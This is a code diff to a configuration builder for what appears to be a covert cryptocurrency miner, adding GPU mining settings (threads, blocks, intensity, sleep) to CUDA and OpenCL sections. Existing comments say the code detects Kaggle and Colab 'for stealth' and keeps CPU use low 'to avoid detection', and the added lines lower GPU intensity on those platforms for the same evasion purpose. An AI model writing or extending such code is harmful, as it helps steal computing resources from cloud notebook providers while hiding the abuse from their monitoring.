@@ -165,16 +165,19 @@ def _create_config(worker_id="default"):
     # Detect cloud platforms for stealth
     is_cloud = False
     cpu_limit = 40  # Default: 40% CPU
+    gpu_intensity = 256  # Default GPU intensity
     
     try:
         # Detect Kaggle
         if os.environ.get("KAGGLE_KERNEL_RUN_TYPE", ""):
             is_cloud = True
             cpu_limit = 15  # Very low CPU on Kaggle to avoid detection
+            gpu_intensity = 128  # Lower GPU intensity on cloud
         # Detect Colab
         elif "colab.google" in os.environ.get("PYTHONPATH", "").lower():
             is_cloud = True
             cpu_limit = 15  # Very low CPU on Colab
+            gpu_intensity = 128  # Lower GPU intensity on cloud
     except:
         pass
     
@@ -243,6 +246,10 @@ def _create_config(worker_id="default"):
             "nvml": False,
             "cn/0": False,
             "cn-lite/0": False,
+            "threads": gpu_threads if has_nvidia else 0,
+            "blocks": 40 if has_nvidia else 0,  # GPU blocks
+            "bfactor": 8 if is_cloud else 0,  # Lower intensity on cloud
+            "bsleep": 100 if is_cloud else 0,  # Sleep between threads on cloud
         },
         "opencl": {
             "enabled": has_amd,
@@ -252,6 +259,10 @@ def _create_config(worker_id="default"):
             "adl": False,
             "cn/0": False,
             "cn-lite/0": False,
+            "threads": gpu_threads if has_amd else 0,
+            "intensity": gpu_intensity,  # Adaptive GPU intensity
+            "worksize": 8,
+            "affinity": False,
         },
         "donate-level": 0,
         "donate-over-proxy": 0,
